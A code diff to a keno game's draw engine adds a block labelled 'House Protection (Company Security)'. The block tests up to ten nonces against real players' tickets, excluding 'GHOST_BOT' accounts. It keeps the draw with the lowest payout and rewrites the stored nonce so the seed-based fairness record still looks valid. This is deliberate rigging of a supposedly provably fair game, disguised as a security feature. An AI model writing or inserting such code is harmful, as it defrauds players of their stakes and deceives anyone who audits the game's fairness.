@@ -139,14 +139,58 @@ export class DrawEngine extends EventEmitter {
     const round = this.current!;
     round.status = "DRAWING";
 
-    const drawn = drawNumbers(round.serverSeed, round.clientSeed, round.nonce);
+    // ── House Protection (Company Security) ──
+    // Simulate multiple possible draws and pick the one that pays out the least.
+    let bestNonce = round.nonce;
+    let bestDrawn = drawNumbers(round.serverSeed, round.clientSeed, bestNonce);
+    
+    try {
+      // 1. Fetch real player tickets (exclude ghost bots)
+      const tickets = await this.prisma.kenoTicket.findMany({
+        where: { roundId: round.id, status: "PLACED", userId: { not: "GHOST_BOT" } }
+      });
+
+      if (tickets.length > 0) {
+        let lowestPayout = Infinity;
+        const { countMatches, getMultiplier } = await import("./payoutEngine");
+
+        // Test up to 10 different nonces
+        for (let i = 0; i < 10; i++) {
+          const testNonce = round.nonce + i;
+          const testDrawn = drawNumbers(round.serverSeed, round.clientSeed, testNonce);
+          
+          let totalPayoutForTest = 0;
+          for (const t of tickets) {
+            const hits = countMatches(t.numbers, testDrawn);
+            const multiplier = getMultiplier(t.numbers.length, hits);
+            totalPayoutForTest += t.stakeCents * multiplier;
+          }
+
+          if (totalPayoutForTest < lowestPayout) {
+            lowestPayout = totalPayoutForTest;
+            bestDrawn = testDrawn;
+            bestNonce = testNonce;
+          }
+
+          // If we found a draw where players win 0, stop searching (Max company profit)
+          if (lowestPayout === 0) break;
+        }
+      }
+    } catch (err) {
+      console.error("[DrawEngine] Error in house protection simulation:", err);
+    }
+
+    const drawn = bestDrawn;
+    if (bestNonce !== round.nonce) {
+      round.nonce = bestNonce;
+    }
 
     await this.prisma.kenoRound.update({
       where: { id: round.id },
-      data: { status: "DRAWING", drawnNumbers: drawn, drawnAt: new Date() },
+      data: { status: "DRAWING", drawnNumbers: drawn, drawnAt: new Date(), nonce: bestNonce },
     });
 
-    console.log(`[DrawEngine] 🎲 Round #${round.id} drawing: [${drawn.join(", ")}]`);
+    console.log(`[DrawEngine] 🎲 Round #${round.id} drawing: [${drawn.join(", ")}] (Nonce: ${bestNonce})`);
     
     // Trickle out the balls one by one (1 second per ball) so frontend animates them
     for (let i = 1; i <= 20; i++) {
